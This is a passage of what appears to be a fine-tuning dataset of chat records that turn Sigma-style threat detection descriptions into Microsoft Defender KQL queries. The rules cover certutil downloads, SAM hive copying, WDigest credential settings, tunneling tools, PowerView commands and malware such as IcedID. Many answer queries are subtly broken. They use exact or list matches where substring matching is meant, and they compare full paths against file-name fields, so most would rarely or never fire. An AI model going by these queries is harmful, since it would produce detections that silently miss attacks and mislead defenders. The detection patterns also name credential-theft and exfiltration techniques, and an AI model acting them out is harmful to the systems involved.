\"3c884f776fbd16597c072afd81029e8764dd57ee79d798829ca111f5e170bd8e\" or SHA256 startswith \"1922a419f57afb351b58330ed456143cc8de8b3ebcbd236d26a219b03b3464d7\" or SHA256 startswith \"fe0e4ef832b62d49b43433e10c47dc51072959af93963c790892efc20ec422f1\" or SHA256 startswith \"7ce9e1c5562c8a5c93878629a47fe6071a35d604ed57a8f918f3eadf82c11a9c\" or SHA256 startswith \"178d5ee8c04401d332af331087a80fb4e5e2937edfba7266f9be34a5029b6945\" or SHA256 startswith \"51f70956fa8c487784fd21ab795f6ba2199b5c2d346acdeef1de0318a4c729d9\" or SHA256 startswith \"889bca95f1a69e94aaade1e959ed0d3620531dc0fc563be9a8decf41899b4d79\" or SHA256 startswith \"332ddaa00e2eb862742cb8d7e24ce52a5d38ffb22f6c8bd51162bd35e84d7ddf\" or SHA256 startswith \"44bcf82fa536318622798504e8369e9dcdb32686b95fcb44579f0b4efa79df08\" or SHA256 startswith \"63552772fdd8c947712a2cff00dfe25c7a34133716784b6d486227384f8cf3ef\" or SHA256 startswith \"056744a3c371b5938d63c396fe094afce8fb153796a65afa5103e1bffd7ca070\") or (SHA1 startswith \"53a44c2396d15c3a03723fa5e5db54cafd527635\" or SHA1 startswith \"9c5e496921e3bc882dc40694f1dcc3746a75db19\" or SHA1 startswith \"aeb573accfd95758550cf30bf04f389a92922844\" or SHA1 startswith \"79ef78a797403a4ed1a616c68e07fff868a8650a\" or SHA1 startswith \"4f6f38b4cec35e895d91c052b1f5a83d665c2196\" or SHA1 startswith \"1e8c2cac2e4ce7cbd33c3858eb2e24531cb8a84d\" or SHA1 startswith \"e841a63e47361a572db9a7334af459ddca11347a\" or SHA1 startswith \"c28f606df28a9bc8df75a4d5e5837fc5522dd34d\" or SHA1 startswith \"2e94b305d6812a9f96e6781c888e48c7fb157b6b\" or SHA1 startswith \"dd44133716b8a241957b912fa6a02efde3ce3025\" or SHA1 startswith \"8793bf166cb89eb55f0593404e4e933ab605e803\" or SHA1 startswith \"a39b57032dbb2335499a51e13470a7cd5d86b138\" or SHA1 startswith \"41cc2b15c662bc001c0eb92f6cc222934f0beeea\" or SHA1 startswith \"d209430d6af54792371174e70e27dd11d3def7a7\" or SHA1 startswith \"1c6452026c56efd2c94cea7e0f671eb55515edb0\" or SHA1 startswith \"c6b41d3afdcdcaf9f442bbe772f5da871801fd5a\" or SHA1 startswith \"4923d460e22fbbf165bbbaba168e5a46b8157d9f\" or SHA1 startswith \"f201504bd96e81d0d350c3a8332593ee1c9e09de\" or SHA1 startswith \"ddd2db1127632a2a52943a2fe516a2e7d05d70d2\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of \"msiexec.exe\" in the \"bin\" directory of the ManageEngine SupportCenter Plus (Related to CVE-2021-44077) and public POC available (See references section) Topic: file_event_win_cve_2021_44077_poc_default_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\ManageEngine\\\\SupportCenterPlus\\\\bin\\\\msiexec.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious file based on their extension being created in \"C:\\PerfLogs\\\". Note that this directory mostly contains \".etl\" files Topic: file_event_win_perflogs_susp_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".7z\", \".bat\", \".bin\", \".chm\", \".dll\", \".exe\", \".hta\", \".lnk\", \".ps1\", \".psm1\", \".py\", \".scr\", \".sys\", \".vbe\", \".vbs\", \".zip\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of crontab to list the tasks of the user Topic: proc_creation_lnx_crontab_enumeration"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -l\" and InitiatingProcessFolderPath =~ \"/crontab\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects programs on a Windows system that should not write scripts to disk Topic: file_event_win_susp_legitimate_app_dropping_script"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".ps1\", \".bat\", \".vbs\", \".scf\", \".wsf\", \".wsh\")) and (InitiatingProcessFolderPath in~ (\"\\\\eqnedt32.exe\", \"\\\\wordpad.exe\", \"\\\\wordview.exe\", \"\\\\certutil.exe\", \"\\\\certoc.exe\", \"\\\\CertReq.exe\", \"\\\\Desktopimgdownldr.exe\", \"\\\\esentutl.exe\", \"\\\\mshta.exe\", \"\\\\AcroRd32.exe\", \"\\\\RdrCEF.exe\", \"\\\\hh.exe\", \"\\\\finger.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Topic: proc_creation_macos_system_shutdown_reboot"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"/shutdown\", \"/reboot\", \"/halt\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of certutil with certain flags that allow the utility to download files. Topic: proc_creation_win_certutil_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"urlcache \", \"verifyctl \")) and ProcessCommandLine =~ \"http\" and (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to access the \"unattend.xml\" file, where credentials might be stored.\nThis file is used during the unattended windows install process.\n Topic: file_access_win_susp_unattend_xml"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName endswith \"\\\\Panther\\\\unattend.xml\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker register a new SIP provider for persistence and defense evasion Topic: registry_set_persistence_mpnotify"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\mpnotify\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Administrative shares are hidden network shares created by Microsoft Windows NT operating systems that grant system administrators remote access to every disk volume on a network-connected system Topic: registry_set_disable_administrative_share"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Services\\\\LanmanServer\\\\Parameters*\" and (RegistryKey endswith \"\\\\AutoShareWks\" or RegistryKey endswith \"\\\\AutoShareServer\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems Topic: proc_creation_win_hktl_sharpview"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"SharpView.exe\" or FolderPath endswith \"\\\\SharpView.exe\" or (ProcessCommandLine contains \"Add-RemoteConnection\" or ProcessCommandLine contains \"Convert-ADName\" or ProcessCommandLine contains \"ConvertFrom-SID\" or ProcessCommandLine contains \"ConvertFrom-UACValue\" or ProcessCommandLine contains \"Convert-SidToName\" or ProcessCommandLine contains \"Export-PowerViewCSV\" or ProcessCommandLine contains \"Find-DomainObjectPropertyOutlier\" or ProcessCommandLine contains \"Find-DomainProcess\" or ProcessCommandLine contains \"Find-DomainShare\" or ProcessCommandLine contains \"Find-DomainUserEvent\" or ProcessCommandLine contains \"Find-DomainUserLocation\" or ProcessCommandLine contains \"Find-ForeignGroup\" or ProcessCommandLine contains \"Find-ForeignUser\" or ProcessCommandLine contains \"Find-GPOComputerAdmin\" or ProcessCommandLine contains \"Find-GPOLocation\" or ProcessCommandLine contains \"Find-Interesting\" or ProcessCommandLine contains \"Find-LocalAdminAccess\" or ProcessCommandLine contains \"Find-ManagedSecurityGroups\" or ProcessCommandLine contains \"Get-CachedRDPConnection\" or ProcessCommandLine contains \"Get-DFSshare\" or ProcessCommandLine contains \"Get-DomainComputer\" or ProcessCommandLine contains \"Get-DomainController\" or ProcessCommandLine contains \"Get-DomainDFSShare\" or ProcessCommandLine contains \"Get-DomainDNSRecord\" or ProcessCommandLine contains \"Get-DomainFileServer\" or ProcessCommandLine contains \"Get-DomainForeign\" or ProcessCommandLine contains \"Get-DomainGPO\" or ProcessCommandLine contains \"Get-DomainGroup\" or ProcessCommandLine contains \"Get-DomainGUIDMap\" or ProcessCommandLine contains \"Get-DomainManagedSecurityGroup\" or ProcessCommandLine contains \"Get-DomainObject\" or ProcessCommandLine contains \"Get-DomainOU\" or ProcessCommandLine contains \"Get-DomainPolicy\" or ProcessCommandLine contains \"Get-DomainSID\" or ProcessCommandLine contains \"Get-DomainSite\" or ProcessCommandLine contains \"Get-DomainSPNTicket\" or ProcessCommandLine contains \"Get-DomainSubnet\" or ProcessCommandLine contains \"Get-DomainTrust\" or ProcessCommandLine contains \"Get-DomainUserEvent\" or ProcessCommandLine contains \"Get-ForestDomain\" or ProcessCommandLine contains \"Get-ForestGlobalCatalog\" or ProcessCommandLine contains \"Get-ForestTrust\" or ProcessCommandLine contains \"Get-GptTmpl\" or ProcessCommandLine contains \"Get-GroupsXML\" or ProcessCommandLine contains \"Get-LastLoggedOn\" or ProcessCommandLine contains \"Get-LoggedOnLocal\" or ProcessCommandLine contains \"Get-NetComputer\" or ProcessCommandLine contains \"Get-NetDomain\" or ProcessCommandLine contains \"Get-NetFileServer\" or ProcessCommandLine contains \"Get-NetForest\" or ProcessCommandLine contains \"Get-NetGPO\" or ProcessCommandLine contains \"Get-NetGroupMember\" or ProcessCommandLine contains \"Get-NetLocalGroup\" or ProcessCommandLine contains \"Get-NetLoggedon\" or ProcessCommandLine contains \"Get-NetOU\" or ProcessCommandLine contains \"Get-NetProcess\" or ProcessCommandLine contains \"Get-NetRDPSession\" or ProcessCommandLine contains \"Get-NetSession\" or ProcessCommandLine contains \"Get-NetShare\" or ProcessCommandLine contains \"Get-NetSite\" or ProcessCommandLine contains \"Get-NetSubnet\" or ProcessCommandLine contains \"Get-NetUser\" or ProcessCommandLine contains \"Get-PathAcl\" or ProcessCommandLine contains \"Get-PrincipalContext\" or ProcessCommandLine contains \"Get-RegistryMountedDrive\" or ProcessCommandLine contains \"Get-RegLoggedOn\" or ProcessCommandLine contains \"Get-WMIRegCachedRDPConnection\" or ProcessCommandLine contains \"Get-WMIRegLastLoggedOn\" or ProcessCommandLine contains \"Get-WMIRegMountedDrive\" or ProcessCommandLine contains \"Get-WMIRegProxy\" or ProcessCommandLine contains \"Invoke-ACLScanner\" or ProcessCommandLine contains \"Invoke-CheckLocalAdminAccess\" or ProcessCommandLine contains \"Invoke-Kerberoast\" or ProcessCommandLine contains \"Invoke-MapDomainTrust\" or ProcessCommandLine contains \"Invoke-RevertToSelf\" or ProcessCommandLine contains \"Invoke-Sharefinder\" or ProcessCommandLine contains \"Invoke-UserImpersonation\" or ProcessCommandLine contains \"Remove-DomainObjectAcl\" or ProcessCommandLine contains \"Remove-RemoteConnection\" or ProcessCommandLine contains \"Request-SPNTicket\" or ProcessCommandLine contains \"Set-DomainObject\" or ProcessCommandLine contains \"Test-AdminAccess\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious or uncommon parent processes of PowerShell Topic: proc_creation_win_powershell_susp_parent_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath contains \"tomcat\" or (InitiatingProcessFolderPath endswith \"\\\\amigo.exe\" or InitiatingProcessFolderPath endswith \"\\\\browser.exe\" or InitiatingProcessFolderPath endswith \"\\\\chrome.exe\" or InitiatingProcessFolderPath endswith \"\\\\firefox.exe\" or InitiatingProcessFolderPath endswith \"\\\\httpd.exe\" or InitiatingProcessFolderPath endswith \"\\\\iexplore.exe\" or InitiatingProcessFolderPath endswith \"\\\\jbosssvc.exe\" or InitiatingProcessFolderPath endswith \"\\\\microsoftedge.exe\" or InitiatingProcessFolderPath endswith \"\\\\microsoftedgecp.exe\" or InitiatingProcessFolderPath endswith \"\\\\MicrosoftEdgeSH.exe\" or InitiatingProcessFolderPath endswith \"\\\\mshta.exe\" or InitiatingProcessFolderPath endswith \"\\\\nginx.exe\" or InitiatingProcessFolderPath endswith \"\\\\outlook.exe\" or InitiatingProcessFolderPath endswith \"\\\\php-cgi.exe\" or InitiatingProcessFolderPath endswith \"\\\\regsvr32.exe\" or InitiatingProcessFolderPath endswith \"\\\\rundll32.exe\" or InitiatingProcessFolderPath endswith \"\\\\safari.exe\" or InitiatingProcessFolderPath endswith \"\\\\services.exe\" or InitiatingProcessFolderPath endswith \"\\\\sqlagent.exe\" or InitiatingProcessFolderPath endswith \"\\\\sqlserver.exe\" or InitiatingProcessFolderPath endswith \"\\\\sqlservr.exe\" or InitiatingProcessFolderPath endswith \"\\\\vivaldi.exe\" or InitiatingProcessFolderPath endswith \"\\\\w3wp.exe\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessCommandLine contains \"/c powershell\" or ProcessCommandLine contains \"/c pwsh\") or ProcessVersionInfoFileDescription =~ \"Windows PowerShell\" or ProcessVersionInfoProductName =~ \"PowerShell Core 6\" or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious command line flags that let the user set a target user and command as e.g. seen in PsExec-like tools Topic: proc_creation_win_susp_privilege_escalation_cli_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -c cmd\", \" -c \\\"cmd\", \" -c powershell\", \" -c \\\"powershell\", \" --command cmd\", \" --command powershell\", \" -c whoami\", \" -c wscript\", \" -c cscript\")) and (ProcessCommandLine in~ (\" -u system \", \" --user system \", \" -u NT\", \" -u \\\"NT\", \" -u 'NT\", \" --system \", \" -u administrator \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of the \"Squirrel.exe\" binary to execute arbitrary processes. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n Topic: proc_creation_win_squirrel_proxy_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"--processStart\", \"--processStartAndWait\", \"--createShortcut\")) and (InitiatingProcessFolderPath in~ (\"\\\\squirrel.exe\", \"\\\\update.exe\"))) and (not(((ProcessCommandLine in~ (\":\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Discord\\\\Update.exe\", \" --processStart\", \"Discord.exe\")) or (ProcessCommandLine in~ (\":\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\GitHubDesktop\\\\Update.exe\", \"GitHubDesktop.exe\")) or (ProcessCommandLine in~ (\":\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Microsoft\\\\Teams\\\\Update.exe\", \"Teams.exe\")) or (ProcessCommandLine in~ (\":\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\yammerdesktop\\\\Update.exe\", \"Yammer.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of well known tools that can be abused for data exfiltration and tunneling. Topic: proc_creation_win_susp_exfil_and_tunneling_tool_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"\\\\httptunnel.exe\", \"\\\\plink.exe\", \"\\\\socat.exe\", \"\\\\stunnel.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky.\n Topic: proc_creation_win_qemu_suspicious_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"restrict=off\", \"-netdev \", \"connect=\", \"-nographic\")) and (not((ProcessCommandLine in~ (\" -cdrom \", \" type=virt \", \" -blockdev \"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report Topic: proc_creation_win_malware_pingback_backdoor"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\updata.exe\" and (ProcessCommandLine in~ (\"config\", \"msdtc\", \"start\", \"auto\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware Topic: proc_creation_win_schtasks_env_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\":\\\\Perflogs\", \":\\\\Users\\\\All Users\\\\\", \":\\\\Users\\\\Default\\\\\", \":\\\\Users\\\\Public\", \":\\\\Windows\\\\Temp\", \"\\\\AppData\\\\Local\\\\\", \"\\\\AppData\\\\Roaming\\\\\", \"%AppData%\", \"%Public%\")) and (ProcessCommandLine =~ \" /create \" and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\")) or (InitiatingProcessCommandLine =~ \"\\\\svchost.exe -k netsvcs -p -s Schedule\" and (ProcessCommandLine in~ (\":\\\\Perflogs\", \":\\\\Windows\\\\Temp\", \"\\\\Users\\\\Public\", \"%Public%\")))) and (not(((ProcessCommandLine in~ (\"/Create /Xml \\\"C:\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\.CR.\", \"Avira_Security_Installation.xml\")) or (ProcessCommandLine in~ (\"/Create /F /TN\", \"/Xml \", \"\\\\AppData\\\\Local\\\\Temp\\\\is-\", \"Avira_\")) or (ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"/Create /TN \\\"klcp_update\\\" /XML \", \"\\\\klcp_update_task.xml\")) or (InitiatingProcessCommandLine contains \"unattended.ini\" or ProcessCommandLine contains \"update_task.xml\") or ProcessCommandLine =~ \"/Create /TN TVInstallRestore /TR\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\" Topic: proc_creation_win_powershell_base64_reflection_assembly_load_obfusc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ\", \"oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA\", \"6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA\", \"OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ\", \"oAOgAoACIATABvACIAKwAiAGEAZAAiACkA\", \"6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA\", \"OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ\", \"oAOgAoACIATABvAGEAIgArACIAZAAiACkA\", \"6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA\", \"OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ\", \"oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA\", \"6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA\", \"OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ\", \"oAOgAoACcATABvACcAKwAnAGEAZAAnACkA\", \"6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA\", \"OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ\", \"oAOgAoACcATABvAGEAJwArACcAZAAnACkA\", \"6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory. Topic: image_load_side_load_windows_defender"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\mpclient.dll\" and (InitiatingProcessFolderPath in~ (\"\\\\MpCmdRun.exe\", \"\\\\NisSrv.exe\"))) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Windows Defender\\\\\", \"C:\\\\Program Files\\\\Microsoft Security Client\\\\\", \"C:\\\\Program Files\\\\Windows Defender\\\\\", \"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation or modification of a powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence Topic: file_event_win_susp_powershell_profile"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\Microsoft.PowerShell_profile.ps1\", \"\\\\PowerShell\\\\profile.ps1\", \"\\\\Program Files\\\\PowerShell\\\\7-preview\\\\profile.ps1\", \"\\\\Program Files\\\\PowerShell\\\\7\\\\profile.ps1\", \"\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\profile.ps1\", \"\\\\WindowsPowerShell\\\\profile.ps1\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries Topic: proc_creation_win_renamed_pressanykey"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"Microsoft.NodejsTools.PressAnyKey.exe\" and (not(InitiatingProcessFolderPath =~ \"\\\\Microsoft.NodejsTools.PressAnyKey.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\n Topic: proc_creation_win_quickassist_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\QuickAssist.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential malicious modification of the property value of UseLogonCredential from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to enable clear-text credentials Topic: registry_set_wdigest_enable_uselogoncredential"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"WDigest\\\\UseLogonCredential\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE. Topic: proc_creation_win_dotnet_arbitrary_dll_csproj_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\dotnet.exe\" or ProcessVersionInfoOriginalFileName =~ \".NET Host\") and (ProcessCommandLine endswith \".csproj\" or ProcessCommandLine endswith \".csproj\\\"\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".dll\\\"\" or ProcessCommandLine endswith \".csproj'\" or ProcessCommandLine endswith \".dll'\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure. Topic: proc_creation_win_csvde_export"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\csvde.exe\" or ProcessVersionInfoOriginalFileName =~ \"csvde.exe\") and ProcessCommandLine =~ \" -f\") and (not(ProcessCommandLine =~ \" -i\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\". Topic: proc_creation_win_susp_add_user_local_admin_group"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" administrators \", \" administrateur\")) and ((ProcessCommandLine contains \"localgroup \" and ProcessCommandLine contains \" /add\") or (ProcessCommandLine contains \"Add-LocalGroupMember \" and ProcessCommandLine contains \" -Group \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects RunDLL32.exe executing a single digit DLL named \"1.dll\" with the export function \"DllRegisterServer\". This behaviour was often seen used by malware and especially IcedID Topic: proc_creation_win_malware_icedid_rundll32_dllregisterserver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"\\\\1.dll, DllRegisterServer\" or ProcessCommandLine endswith \" 1.dll, DllRegisterServer\") and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated use of Environment Variables to execute PowerShell Topic: proc_creation_win_hktl_invoke_obfuscation_var"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"cmd.{0,5}(?:/c|/r)(?:\\\\s|)\\\\\"set\\\\s[a-zA-Z]{3,6}.*(?:\\\\{\\\\d\\\\}){1,}\\\\\\\\\\\\\"\\\\s+?\\\\-f(?:.*\\\\)){1,}.*\\\\\"\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Sysinternals PsService which can be abused for service reconnaissance and tampering Topic: proc_creation_win_sysinternals_psservice"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"psservice.exe\" or (FolderPath endswith \"\\\\PsService.exe\" or FolderPath endswith \"\\\\PsService64.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious PowerShell scripts accessing SAM hives Topic: proc_creation_win_powershell_sam_access"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\HarddiskVolumeShadowCopy\", \"System32\\\\config\\\\sam\")) and (ProcessCommandLine in~ (\"Copy-Item\", \"cp $_.\", \"cpi $_.\", \"copy $_.\", \".File]::Copy(\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry value settings that would replace the users desktop background.\nThis is a common technique used by malware to change the desktop background to a ransom note or other image.\n Topic: registry_set_desktop_background_change"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"Control Panel\\\\Desktop\" or RegistryKey contains \"CurrentVersion\\\\Policies\\\\ActiveDesktop\" or RegistryKey contains \"CurrentVersion\\\\Policies\\\\System\") and ((RegistryValueData =~ \"DWORD (0x00000001)\" and RegistryKey endswith \"NoChangingWallpaper\") or RegistryKey endswith \"\\\\Wallpaper\" or (RegistryValueData =~ \"2\" and RegistryKey endswith \"\\\\WallpaperStyle\")) and (not(InitiatingProcessFolderPath =~ \"\\\\svchost.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line parameters used by Koadic hack tool Topic: proc_creation_win_hktl_koadic"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/q\", \"/c\", \"chcp\")) and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
